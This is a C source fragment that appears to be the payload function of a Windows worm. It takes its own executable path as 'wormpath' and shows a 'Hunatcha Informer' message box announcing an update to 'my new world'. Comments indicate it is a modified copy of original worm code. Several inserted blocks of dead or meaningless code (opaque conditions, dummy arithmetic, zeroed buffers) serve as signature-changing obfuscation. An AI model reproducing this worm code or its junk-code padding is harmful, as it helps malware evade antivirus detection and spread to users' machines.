#include <windows.h>
#include <stdio.h>
#include <string.h>   // <-- ADD THIS LINE

void _Payload(void)
{
    char wormpath[MAX_PATH];
    GetModuleFileNameA(NULL, wormpath, MAX_PATH);
    // (wormpath is unused, as in original)

    volatile int dummy_x_1 = 7;
    if ((dummy_x_1 * (dummy_x_1 + 1)) % 2 != 0) {
        SYSTEM_INFO si;
        GetSystemInfo(&si);
        char local_buf[64];
        memset(local_buf, 0, sizeof(local_buf));
        for (int i = 0; i < 5; ++i) {
            int dummy_result_1 = (local_buf[i] ^ 0x811C9DC5) * si.dwNumberOfProcessors;
            local_buf[i] += dummy_result_1 % 256;
        }
        SecureZeroMemory(local_buf, sizeof(local_buf));
    }

    char msg[MAX_PATH];
    strcpy(msg, "Your system need to update my new world...");
    MessageBoxA(NULL, msg, "Hunatcha Informer", MB_ICONINFORMATION);

    volatile DWORD dummy_tick_2 = GetTickCount();
    if ((dummy_tick_2 ^ 0x5A5A5A5A) == 0xFFFFFFFF && (dummy_tick_2 & 0x80000000) != 0) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        char local_buf[64];
        memset(local_buf, 0, sizeof(local_buf));
        for (int i = 0; i < 5; ++i) {
            int dummy_result_2 = (local_buf[i] ^ st.wMilliseconds) * st.wDay;
            local_buf[i] += dummy_result_2 % 256;
        }
        SecureZeroMemory(local_buf, sizeof(local_buf));
    }

    if (GetPriorityClass(GetCurrentProcess()) == 0xFFFFFFFF) {
        char local_buf[64];
        memset(local_buf, 0, sizeof(local_buf));
        for (int i = 0; i < 5; ++i) {
            int dummy_result_3 = (local_buf[i] ^ 0x811C9DC5) * GetTickCount();
            local_buf[i] += dummy_result_3 % 256;
        }
        SecureZeroMemory(local_buf, sizeof(local_buf));
    }
}
